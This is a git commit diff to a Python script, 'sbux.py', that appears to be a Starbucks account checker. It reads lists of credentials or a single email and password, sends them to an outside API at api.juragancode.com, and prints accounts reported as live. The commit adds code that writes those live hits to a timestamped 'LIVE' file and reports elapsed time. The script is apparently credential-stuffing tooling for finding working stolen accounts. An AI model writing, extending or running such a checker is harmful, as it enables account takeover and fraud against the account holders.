610593929335bcdb22d6fb368b649d3fb250d298
indrha7x <inr404@gmail.com>
2018-10-06 13:22:12 +0700

    Update sbux.py

--- sbux.py
+++ sbux.py
@@ -4,7 +4,10 @@
 import requests
 import sys
 import time
+from datetime import datetime
 import json
+import os
+import slugify
 
 class bcolors:
     HEADER = '\033[95m'
@@ -18,11 +21,12 @@ class bcolors:
 
 print "Choose Service\n1. Mass Checking\n2. Single Check"
 data = int(raw_input("Choose: "))
-url = "http://api.juragancode.com/sbux.php"
+url = "http://api.juragancode.com/developed.php"
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
 			'Accept': '*/*'}
 if data == 1:
 	print "[+] Starting Engine..."
+	start_time = time.time()
 	time.sleep(2)
 	file = str(raw_input("[+] Enter File Name: "))
 	x = open(file, "r")
@@ -38,8 +42,22 @@ if data == 1:
 		colorized = result["error"]
 		if colorized ==0 :
 			print bcolors.OKGREEN + result["msg"]
+			live = bcolors.OKGREEN + result["msg"]
+			save = str(live)
+			tanggal = datetime.today()
+			dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
+			date = str(dtwithoutseconds).replace(':', '_')
+			filename = u"LIVE-%s.txt"%date
+			# filename = slugify(filename)
+			save = open(filename, 'a')
+			save.write(live+'\n')
+			save.close()
 		else:
 			print bcolors.FAIL + result["msg"]
+	elapsed_time = time.time() - start_time
+	print "[+] Job Done!"
+	print "[+] Total Time: ",elapsed_time
+	print "[+] Result was Saved as LIVE-{}.txt".format(date)
 if data ==2:
 	file = str(raw_input("[+] Email: "))
 	file2 = str(raw_input("[+] Password: "))
